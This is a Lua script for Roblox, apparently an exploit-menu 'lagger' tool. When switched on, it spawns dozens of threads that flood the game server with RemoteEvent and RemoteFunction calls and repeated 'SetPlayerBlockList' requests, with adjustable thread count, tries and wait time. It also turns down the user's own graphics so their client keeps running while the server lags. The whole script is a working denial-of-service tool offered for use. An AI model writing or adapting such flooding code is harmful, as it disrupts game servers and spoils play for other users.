local isLaggerActive = false
local running = false
local currentThreads = 50
local currentTries = 1
local currentWaitTime = 0.05
local originalFpsCap = nil

local originalGraphicsSettings = {
    Brightness = Lighting.Brightness,
    ClockTime = Lighting.ClockTime,
    GlobalShadows = Lighting.GlobalShadows,
    Technology = Lighting.Technology,
    FogEnd = Lighting.FogEnd,
    FogStart = Lighting.FogStart,
    ShadowSoftness = Lighting.ShadowSoftness,
}

local function enableAntiLag()
    pcall(function()
        local settings = UserSettings()
        local gameSettings = settings:GetService("UserGameSettings")
        originalFpsCap = gameSettings.TargetFramerate
        gameSettings.TargetFramerate = 45
        gameSettings.MasterVolume = 0
        gameSettings.GraphicsMode = Enum.GraphicsMode.Automatic
        gameSettings.SavedQualityLevel = 1
    end)
    Lighting.Brightness = 0
    Lighting.ClockTime = 12
    Lighting.GlobalShadows = false
    Lighting.Technology = Enum.Technology.Compatibility
    Lighting.FogEnd = 1000
    Lighting.FogStart = 1000
    Lighting.ShadowSoftness = 0
    Workspace.CurrentCamera.FieldOfView = 70
    for _, v in pairs(Workspace:GetDescendants()) do
        if v:IsA("Decal") or v:IsA("Texture") then
            v.Transparency = 1
        elseif v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Fire") then
            v.Enabled = false
        end
    end
end

local function disableAntiLag()
    pcall(function()
        local settings = UserSettings()
        local gameSettings = settings:GetService("UserGameSettings")
        if originalFpsCap ~= nil then
            gameSettings.TargetFramerate = originalFpsCap
        else
            gameSettings.TargetFramerate = 0
        end
        gameSettings.MasterVolume = 5
        gameSettings.GraphicsMode = Enum.GraphicsMode.Automatic
        gameSettings.SavedQualityLevel = 10
    end)
    Lighting.Brightness = originalGraphicsSettings.Brightness
    Lighting.ClockTime = originalGraphicsSettings.ClockTime
    Lighting.GlobalShadows = originalGraphicsSettings.GlobalShadows
    Lighting.Technology = originalGraphicsSettings.Technology
    Lighting.FogEnd = originalGraphicsSettings.FogEnd
    Lighting.FogStart = originalGraphicsSettings.FogStart
    Lighting.ShadowSoftness = originalGraphicsSettings.ShadowSoftness
    for _, v in pairs(Workspace:GetDescendants()) do
        if v:IsA("Decal") or v:IsA("Texture") then
            v.Transparency = 0
        elseif v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Fire") then
            v.Enabled = true
        end
    end
end

local function updateSwitchUI()
    if isLaggerActive then
        toggleSwitch.BackgroundColor3 = Color3.fromRGB(40, 180, 40)
        local tweenKnob = TweenService:Create(switchKnob, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Position = UDim2.new(1, -34, 0.5, -16)})
        tweenKnob:Play()
    else
        toggleSwitch.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
        local tweenKnob = TweenService:Create(switchKnob, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Position = UDim2.new(0, 2, 0.5, -16)})
        tweenKnob:Play()
    end
end

local function startLagger()
    if isLaggerActive then return end
    isLaggerActive = true
    running = true
    updateSwitchUI()
    enableAntiLag()

    local setPlayerBlockList = ReplicatedStorage:FindFirstChild("SetPlayerBlockList")
    
    for i = 1, currentTries do
        task.spawn(function()
            while running do
                local remoteEvent = Instance.new('RemoteEvent')
                local remoteFunction = Instance.new('RemoteFunction')
                
                pcall(function()
                    remoteEvent:FireServer()
                end)
                pcall(function()
                    remoteFunction:InvokeServer()
                end)
                
                remoteEvent:Destroy()
                remoteFunction:Destroy()
                
                if setPlayerBlockList then
                    pcall(function()
                        setPlayerBlockList:FireServer()
                    end)
                end
                
                task.wait(currentWaitTime)
            end
        end)
    end
    
    for i = 1, currentThreads do
        task.spawn(function()
            local remotes = {}
            while running do
                local re = Instance.new('RemoteEvent')
                local rf = Instance.new('RemoteFunction')
                table.insert(remotes, re)
                table.insert(remotes, rf)
                pcall(function()
                    re:FireServer()
                    rf:InvokeServer()
                end)
                if #remotes > 1000 then
                    for _, r in ipairs(remotes) do
                        r:Destroy()
                    end
                    remotes = {}
                end
                task.wait(currentWaitTime)
            end
            for _, r in ipairs(remotes) do
                r:Destroy()
            end
        end)
    end
end

local function stopLagger()
    if not isLaggerActive then return end
    isLaggerActive = false
    running = false
    updateSwitchUI()
    disableAntiLag()
end

local function toggleLagger()
    if isLaggerActive then
        stopLagger()
    else
        startLagger()
    end
end

local function validateAndUpdate()
    local newThreads = tonumber(incInput.Text)
    if newThreads then
        currentThreads = math.max(1, math.floor(newThreads))
        incInput.Text = tostring(currentThreads)
    else
        incInput.Text = tostring(currentThreads)
    end

    local newTries = tonumber(triesInput.Text)
    if newTries then
        currentTries = math.max(1, math.floor(newTries))
        triesInput.Text = tostring(currentTries)
    else
        triesInput.Text = tostring(currentTries)
    end

    local newWait = tonumber(waitInput.Text)
    if newWait then
        currentWaitTime = math.max(0, newWait)
        waitInput.Text = string.format("%.2f", currentWaitTime)
    else
        waitInput.Text = string.format("%.2f", currentWaitTime)
    end

    if isLaggerActive then
        stopLagger()
        startLagger()
    end
end

